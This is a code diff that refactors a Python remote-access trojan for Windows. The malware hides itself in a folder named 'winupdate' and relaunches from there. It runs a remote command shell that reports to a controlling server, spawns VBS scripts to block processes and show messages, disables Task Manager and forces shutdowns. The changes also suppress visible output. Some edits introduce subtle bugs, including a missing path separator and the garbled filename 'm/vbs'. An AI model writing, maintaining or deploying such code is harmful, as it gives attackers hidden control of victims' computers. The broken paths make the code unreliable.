@@ -25,18 +25,18 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
 
 # function to move file to tmp dir and relaunch
 def meltFile():
+    winupdate = TMP + "\\winupdate"
     # ignore if the path is in appdata as well
-    if not (os.getcwd() == TMP + "\\winupdate") and not (os.getcwd() == APPDATA):
+    if not (os.getcwd() == winupdate) and not (os.getcwd() == APPDATA):
         # if folder already exists
         try:
-            os.mkdir(TMP + "\\winupdate")
+            os.mkdir(winupdate)
         except:
             pass
-        strNewFile = TMP + "\\winupdate\\" + os.path.basename(sys.argv[0])
+        strNewFile = winupdate + os.path.basename(sys.argv[0])
 
-        subprocess.Popen(
-            "timeout 2 & move /y " + os.path.realpath(sys.argv[0]) + " " +  # move file to TMP and then relaunch
-            strNewFile + " & cd  /d " + TMP + "\\winupdate\\" + " & " + strNewFile, shell=True)
+        strCommand = f"timeout 2 & move /y {os.path.realpath(sys.argv[0])} {strNewFile} & cd /d {winupdate}\\ & {strNewFile}"
+        subprocess.Popen(strCommand, shell=True)
         sys.exit(0)
 
 
@@ -158,10 +158,10 @@ def recvall(buffer):  # function to receive large amounts of data
 
 # vbs message box
 def MessageBox(message):
-    objVBS = open(TMP + "/m.vbs", "w")
-    objVBS.write("Msgbox \"" + message + "\", vbOKOnly+vbInformation+vbSystemModal, \"Message\"")
-    objVBS.close()
-    subprocess.Popen(["cscript", TMP + "/m.vbs"], shell=True)
+    strScript = TMP + "m/vbs"
+    with open(strScript, "w") as objVBS:
+        objVBS.write(f'Msgbox "{message}", vbOKOnly+vbInformation+vbSystemModal, "Message"')
+    subprocess.Popen(["cscript", strScript], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
 
 
 def screenshot():
@@ -240,7 +240,7 @@ def lock():
 
 def shutdown(shutdowntype):
     command = "shutdown {0} -f -t 30".format(shutdowntype)
-    subprocess.Popen(command.split(), shell=True)
+    subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
     objSocket.close()  # close connection and exit
     sys.exit(0)
 
@@ -262,7 +262,7 @@ def command_shell():
                 strOutput = (objCommand.stdout.read()).decode("utf-8").splitlines()[0]  # decode and remove new line
                 os.chdir(strOutput)  # change directory
 
-                bytData = str.encode("\n" + str(os.getcwd()) + ">")  # output to send the server
+                bytData = str.encode(f"\n{str(os.getcwd())}>")  # output to send the server
 
         elif len(strData) > 0:
             objCommand = subprocess.Popen(strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
@@ -319,10 +319,10 @@ def vbs_block_process(process, popup, message, title, timeout, type):
 
     strVBSCode += "End If" + "\n" + "Loop"
 
-    objVBSFile = open(TMP + "/d.vbs", "w")  # write the code and close the file
-    objVBSFile.write(strVBSCode); objVBSFile.close()
+    with open(TMP + "/d.vbs", "w") as objVBSFile:
+        objVBSFile.write(strVBSCode)
 
-    subprocess.Popen(["cscript", TMP + "/d.vbs"], shell=True)  # run the script
+    subprocess.Popen(["cscript", TMP + "/d.vbs"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)  # run the script
 
 
 def disable_taskmgr():
@@ -330,7 +330,7 @@ def disable_taskmgr():
     if blnDisabled == "False":  # if task manager is already disabled, enable it
         send(str.encode("Enabling ..."))
 
-        subprocess.Popen(["taskkill", "/f", "/im", "cscript.exe"], shell=True)
+        subprocess.Popen(["taskkill", "/f", "/im", "cscript.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
 
         blnDisabled = "True"
     else:
